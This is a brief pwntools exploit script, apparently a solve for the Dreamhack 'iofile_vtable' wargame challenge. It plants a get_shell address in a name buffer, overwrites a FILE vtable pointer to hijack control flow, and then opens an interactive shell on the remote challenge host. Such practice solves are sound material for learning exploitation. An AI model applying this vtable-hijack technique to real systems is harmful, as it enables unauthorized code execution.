from pwn import *
# p = process('./iofile_vtable')
p = remote('host3.dreamhack.games', 8581)
get_shell_addr = 0x40094a
name_addr = 0x00000000006010d0

# gdb.attach(p, gdbscript='''
#            b*main+228
#            c
           
#            ''')
input()

p.recvuntil("what is your name: ")
p.sendline(p64(get_shell_addr))

p.recvuntil('> ')
p.sendline("2")

p.recvuntil('> ')
p.sendline("4")

p.recvuntil('change: ')
p.sendline(p64(name_addr- 0x38))

p.interactive()